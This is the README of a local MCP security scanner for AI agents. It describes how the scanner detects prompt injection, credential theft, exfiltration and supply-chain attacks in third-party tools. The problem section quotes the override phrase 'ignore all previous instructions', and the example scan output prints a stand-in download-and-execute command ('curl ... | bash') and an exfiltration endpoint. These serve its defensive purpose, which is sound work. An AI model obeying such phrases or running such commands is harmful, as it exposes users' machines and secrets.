# Aguara MCP

Local security checks for AI agents before they trust third-party tools.

Aguara MCP gives Claude Code, Cursor, Windsurf, and any MCP-compatible agent a local tool for reviewing untrusted agent content before acting on it.

When an agent is about to install an MCP server, inspect a skill, read a plugin README, or load a tool configuration, it can call Aguara first. The scan runs locally, inside the MCP server, and returns a structured verdict with findings, severity, remediation, and the rule that triggered.

No LLM calls. No network access. No subprocess to the `aguara` binary. The MCP server imports Aguara as a Go library and runs the scanner in-process.

Use it to help agents answer questions like:

- Is this MCP config exposing credentials?
- Does this tool description contain prompt injection?
- Is this README asking the agent to run unsafe install commands?
- Does this skill try to read secrets or exfiltrate data?
- Which rule triggered, and why?

Aguara MCP v0.6.0 is aligned with [Aguara](https://github.com/garagon/aguara) v0.17.0. It includes the current 219-detection catalog, analyzer-emitted rules, sensitivity-based output redaction, Unicode normalization, and context-aware false-positive reduction. Built on the [official MCP SDK](https://github.com/modelcontextprotocol/go-sdk) (v1, Tier 1).

Repository-wide dependency checks are still handled by the Aguara CLI:

```bash
aguara check .
aguara audit . --ci
```

These will land as MCP tools in a future release once Aguara core exposes a stable public `Check` API; see [garagon/aguara](https://github.com/garagon/aguara) for the CLI install path.

## The problem

AI agents are gaining autonomy. They browse registries, discover tools, install MCP servers, and execute third-party code - often without any security review.

This creates a new attack surface. A skill published to a registry today can contain:

- **Prompt injection** that hijacks the agent's behavior ("ignore all previous instructions...")
- **Credential theft** that exfiltrates API keys, tokens, and secrets from the agent's environment
- **Remote code execution** hidden in install scripts (`curl | bash`, shell injection)
- **Data exfiltration** that silently sends user data to attacker-controlled endpoints
- **Supply chain attacks** through dependency confusion and typosquatting

The agent doesn't know. It can't tell a helpful tool from a weaponized one. The description looks normal. The install succeeds. The damage is done.

**This is the gap Aguara MCP fills.** It gives the agent a security advisor it can consult as a tool - the same way a developer would run a linter before merging code. One tool call, milliseconds, entirely local. The agent checks first, then decides.

## Quick start

```bash
curl -fsSL https://raw.githubusercontent.com/garagon/mcp-aguara/main/install.sh | sh
```

One command, one binary, no external dependencies. The installer verifies SHA256 checksums before extracting and fails closed if no sha256 verifier is available on the host (no silent skip).

> Make sure the install directory (`~/.local/bin`) is in your `PATH`. The binary is statically linked with the Aguara rule catalog and analyzers compiled in so all MCP scans run fully offline. Aguara core's OSV-derived threat-intel snapshot is **not** bundled in this binary because the MCP does not expose repository-wide dependency checks yet; use the Aguara CLI for those (see [What still requires the Aguara CLI](#what-still-requires-the-aguara-cli)).

### Add to your AI agent

**Claude Code:**

```bash
claude mcp add aguara -- aguara-mcp
```

**Claude Desktop** - add to `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "aguara": {
      "command": "aguara-mcp"
    }
  }
}
```

**Cursor / Windsurf / any MCP client** - stdio transport with `aguara-mcp`.

Your agent now has a security advisor.

## Tools

### `scan_content`

Scan text for security threats before acting on it. Works on agent skills, READMEs, tool definitions, MCP server descriptions, prompts, package manifest content (`package.json`), and GitHub Actions workflow YAML when the `filename` argument contains `.github/workflows/`. Detects prompt injection (pattern + NLP), credential leaks, exfiltration, command execution, supply-chain patterns, MCP attacks, package metadata risks, JavaScript install-time payload shapes, GitHub Actions trust chains, and Unicode/encoding evasion. **Sensitive matches are redacted** in the response: when a finding is marked `Sensitive=true` (cred+exfil combos, toxic-flow cred reads, MCP_007) or belongs to the `credential-leak` category, `matched_text` is replaced with `[REDACTED]` so the scanner never creates a second copy of the secret. Supports context-aware false-positive reduction via `tool_name`.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `content` | Yes | The text content to scan |
| `filename` | No | Filename hint for rule matching (default: `skill.md`) |
| `tool_name` | No | Tool that generated the content (e.g., `Bash`, `Edit`, `WebFetch`). Enables context-aware false-positive reduction |
| `scan_profile` | No | Enforcement profile: `strict` (default, all rules), `content-aware` (reduced FP for known tools), or `minimal` (flag-only mode) |
| `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
| `disabled_rules` | No | List of rule IDs to skip (e.g., `["PROMPT_INJECTION_001"]`) |

Returns a structured report with verdict (`clean`, `flag`, or `block`), severity-rated findings with remediation guidance, matched patterns, line numbers, confidence scores, and which analysis engine produced each finding.

### `check_mcp_config`

Check an MCP server configuration (JSON) for security issues before adding it to a client. Detects dangerous command shapes in `command`/`args`, credential exposure in `env`, unsafe argument injection, and tool-poisoning patterns. Use on any `mcpServers` entry from Claude Desktop, Cursor, VS Code, or other MCP clients before enabling it. Sensitive matches are redacted in the response.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `config` | Yes | MCP configuration as a JSON string |
| `scan_profile` | No | Enforcement profile: `strict` (default), `content-aware`, or `minimal` |
| `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
| `disabled_rules` | No | List of rule IDs to skip |

### `list_rules`

Browse the cataloged security rules. Returns 219 detections (193 YAML pattern rules + 26 analyzer-emitted rules from jsrisk, toxicflow, pkgmeta, ci-trust, NLP, and rug-pull analyzers) spanning multiple threat categories. Useful when the agent needs to understand what Aguara can detect or filter by category.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `category` | No | Filter by category (e.g., `prompt-injection`, `exfiltration`, `credential-leak`) |

### `explain_rule`

Get detailed information about a specific rule by ID. Resolves both YAML rules (returns patterns plus true/false-positive examples) and analyzer-emitted rule IDs from jsrisk, toxicflow, pkgmeta, ci-trust, NLP, and rug-pull (returns severity, category, analyzer name, description, and remediation; analyzer rules have no inline patterns or examples).

| Parameter | Required | Description |
|-----------|----------|-------------|
| `rule_id` | Yes | Rule ID (e.g., `PROMPT_INJECTION_001`) |

### `discover_mcp`

Discover MCP server configurations on the local machine by reading known MCP client config files (Claude Desktop, Cursor, VS Code, Windsurf, and others). Returns the server definitions including commands, arguments, and environment variables. **Read-only**: this tool never executes the discovered commands and never connects to any server. Pair with `check_mcp_config` to evaluate each definition before acting on it.

No parameters required.

## Example

An agent evaluating whether to install an MCP server from a registry:

```
User: "Install the data-processor MCP server"

Agent (before installing, calls scan_content with the skill README):

→ {
    "summary": "Found 2 issues: 1 critical, 1 high",
    "verdict": "block",
    "findings": [
      {
        "severity": "CRITICAL",
        "rule_id": "SUPPLY_003",
        "rule_name": "Download-and-execute",
        "remediation": "Avoid piping remote scripts directly into a shell. Download first, verify integrity, then execute.",
        "line": 12,
        "matched_text": "curl https://cdn.example.com/setup.sh | bash",
        "analyzer": "pattern"
      },
      {
        "severity": "HIGH",
        "rule_id": "EXFIL_001",
        "rule_name": "Data exfiltration endpoint",
        "line": 34,
        "matched_text": "https://collect.example.com/data",
        "confidence": 0.92,
        "analyzer": "nlp"
      }
    ]
  }

Agent: "I scanned the data-processor skill and found 2 security issues:
a script that downloads and executes remote code, and an endpoint that
could exfiltrate your data. I'd recommend not installing it."
```

Without Aguara MCP, the agent would have installed it silently.

## Coverage

The v0.17 Aguara catalog totals **219 detections** (193 YAML pattern rules + 26 analyzer-emitted) across seven analyzers:

- **Pattern matcher** - regex / contains rules covering prompt injection, credential leaks, exfiltration, command execution, supply-chain patterns, MCP attacks, indirect injection, external download, SSRF/cloud, third-party content, and Unicode attacks. Content is NFKC-normalized before scanning to prevent Unicode evasion.
- **CI trust** - YAML-aware analysis of `.github/workflows/*.yml` for pwn-request chains, cache poisoning, OIDC token surface, and persisted-credentials checkout patterns. Reachable from MCP when the `filename` argument contains `.github/workflows/`.
- **PkgMeta** - `package.json` analysis for install-time lifecycle scripts paired with git-sourced dependencies, optional-git deps, and publish-surface chains.
- **JSRisk** - `.js`/`.mjs`/`.cjs` analysis for obfuscator-shape payloads, install-time daemonization, CI secret harvesting, runner process-memory pivots, and known IOCs (e.g. the May 2026 node-ipc DNS-TXT exfil chain).
- **NLP** - Goldmark-based markdown analysis for prompt-injection, authority-claim, and credential-transmission combos that evade static patterns.
- **Toxic flow** - single-file taint tracking plus cross-file correlation for dangerous capability combinations.
- **Rug-pull** - SHA256-based change detection on tool descriptions over time (used by the Aguara CLI; not currently invoked by MCP tools).

See [garagon/aguara](https://github.com/garagon/aguara) for the canonical category list and rule IDs.

## How it works

```
Agent                  Aguara MCP
  │                          │
  ├─ scan_content(text) ────►│
  │                          ├─ aguara.ScanContent()
  │                          │  or ScanContentAs() with tool context
  │                          │  (in-process, no disk I/O)
  │                          │  219 detections · 6 active analyzers
  │                          │  (pattern + ci-trust + pkgmeta +
  │                          │   jsrisk + NLP + toxic-flow;
  │                          │   rug-pull needs WithStateDir, n/a here)
  │                          │  NFKC normalization · FP reduction
  │                          │  sensitive matches redacted
  │◄─ verdict + findings ────┤
  │                          │
  ├─ discover_mcp() ────────►│
  │                          ├─ aguara.Discover()
  │                          │  (reads local config files)
  │◄─ server definitions ────┤
  │                          │
```

Aguara MCP imports the [Aguara scanner](https://github.com/garagon/aguara) as a Go library - no subprocess, no temp files, no external binary. The scan engine runs in-process with version integrity guaranteed by `go.sum`.

The MCP protocol layer uses the [official Go SDK](https://github.com/modelcontextprotocol/go-sdk) (Tier 1, Linux Foundation governance, v1 semver stability). This ensures protocol compliance and long-term compatibility as the MCP specification evolves.

No network access. No LLM calls. No cloud dependencies. Everything runs locally and deterministically. Scans complete in milliseconds.

## Security

See [SECURITY.md](SECURITY.md) for the vulnerability disclosure policy.

Aguara MCP is itself security-hardened:

- **No subprocess execution** - Aguara runs as an in-process Go library, eliminating PATH hijacking and binary substitution risks
- **No network calls** - every MCP scan is fully offline. The Aguara rule catalog and analyzers are linked in at build time; the OSV-derived threat-intel snapshot is **not** bundled in the MCP binary because the MCP does not expose repository-wide dependency checks (use the Aguara CLI for those)
- **Input validation** - Rule IDs validated against strict format, content size capped at 10 MB
- **Filename sanitization** - Allowlisted characters only, length-capped, no path traversal; the canonical `.github/workflows/<basename>` prefix is preserved so the v0.17 ci-trust analyzer can reach workflow YAML
- **Sensitivity-based output redaction** - Findings marked `Sensitive=true` by Aguara core (cred+exfil combos, toxic-flow cred reads, MCP_007) or belonging to the `credential-leak` category have their `matched_text` replaced with `[REDACTED]` before the MCP serializes the response; the MCP keeps its own defensive guard in addition to Aguara's in-place scrub
- **Signed release pipeline** - release binaries are Cosign-signed with SPDX SBOMs attached, the multi-arch Docker image at `ghcr.io/garagon/mcp-aguara` is signed at digest with SLSA provenance and SBOM attestations; verify with `VERSION=v0.6.0 .github/scripts/verify-release.sh`
- **Version integrity** - Aguara scanner version is pinned in `go.sum`, verified at build time

## Advanced

Debug mode (logs scan details to stderr):

```bash
claude mcp add aguara -- aguara-mcp --debug
```

Build from source:

```bash
git clone https://github.com/garagon/mcp-aguara.git
cd mcp-aguara
make build    # → ./aguara-mcp
make test     # runs all tests
```

### Using Aguara as a Go library

Aguara MCP uses the Aguara public API. You can use it in your own tools:

```go
import "github.com/garagon/aguara"

// Basic scan
result, err := aguara.ScanContent(ctx, content, "skill.md",
    aguara.WithMinSeverity(aguara.SeverityHigh),
    aguara.WithDisabledRules("CRED_001"),
)

// Context-aware scan (reduces false positives for known tools)
result, err = aguara.ScanContentAs(ctx, content, "skill.md", "WebFetch",
    aguara.WithScanProfile(aguara.ProfileContentAware),
)

rules := aguara.ListRules(aguara.WithCategory("prompt-injection"))
detail, err := aguara.ExplainRule("PROMPT_INJECTION_001")
discovered, err := aguara.Discover()
```

See the [Aguara documentation](https://github.com/garagon/aguara) for the full API reference.

## License

[MIT](LICENSE)
